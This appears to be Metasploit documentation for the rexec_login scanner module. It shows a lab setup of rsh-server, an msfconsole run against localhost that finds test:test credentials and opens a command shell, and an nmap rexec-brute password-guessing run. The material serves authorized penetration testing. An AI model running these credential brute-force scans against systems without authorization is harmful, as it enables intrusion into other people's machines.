## Vulnerable Application

The R Services (rexecd, rlogind, and rshd) are a suite of unencrypted remote command/login services developed in the 1980s.
These services are all but unused in modern computing, as they have been replace by telnet and ssh.

The following was done on Kali linux:

  1. `apt-get install rsh-server` which includes: `rexecd`, `rlogind` and `rshd`.
  2. Start the service: `service openbsd-inetd start`

## Verification Steps

  1. Install and configure rexec
  2. Start msfconsole
  3. Do: `use auxiliary/scanner/rservices/rexec_login`
  4. Do: `set rhosts`
  5. Set any other credentials that will need to be set
  6. Do: `run`

## Scenarios

  A run against the configuration from these docs

  ```
    msf > use auxiliary/scanner/rservices/rexec_login 
    msf auxiliary(rexec_login) > set username test
    username => test
    msf auxiliary(rexec_login) > set password 'test'
    password => test
    msf auxiliary(rexec_login) > run
    
    [*] 127.0.0.1:512         - 127.0.0.1:512 - Starting rexec sweep
    [+] 127.0.0.1:512         - 127.0.0.1:512, rexec 'test' : 'test'
    [!] 127.0.0.1:512         - *** auxiliary/scanner/rservices/rexec_login is still calling the deprecated report_auth_info method! This needs to be updated!
    [!] 127.0.0.1:512         - *** For detailed information about LoginScanners and the Credentials objects see:
    [!] 127.0.0.1:512         -      https://github.com/rapid7/metasploit-framework/wiki/Creating-Metasploit-Framework-LoginScanners
    [!] 127.0.0.1:512         -      https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-HTTP-LoginScanner-Module
    [!] 127.0.0.1:512         - *** For examples of modules converted to just report credentials without report_auth_info, see:
    [!] 127.0.0.1:512         -      https://github.com/rapid7/metasploit-framework/pull/5376
    [!] 127.0.0.1:512         -      https://github.com/rapid7/metasploit-framework/pull/5377
    [*] Command shell session 2 opened (127.0.0.1:37489 -> 127.0.0.1:512) at 2017-04-27 20:56:54 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
  ```

## Confirming using NMAP

Utilizing [rexec-brute](https://nmap.org/nsedoc/scripts/rexec-brute.html)

  ```
    nmap -p 512 --script rexec-brute 127.0.0.1
    
    Starting Nmap 7.40 ( https://nmap.org ) at 2017-04-27 21:23 EDT
    Nmap scan report for localhost (127.0.0.1)
    Host is up (0.000037s latency).
    PORT    STATE SERVICE
    512/tcp open  exec
    | rexec-brute: 
    |   Accounts: 
    |     test:test - Valid credentials
    |_  Statistics: Performed 7085940 guesses in 629 seconds, average tps: 9231.6
  ```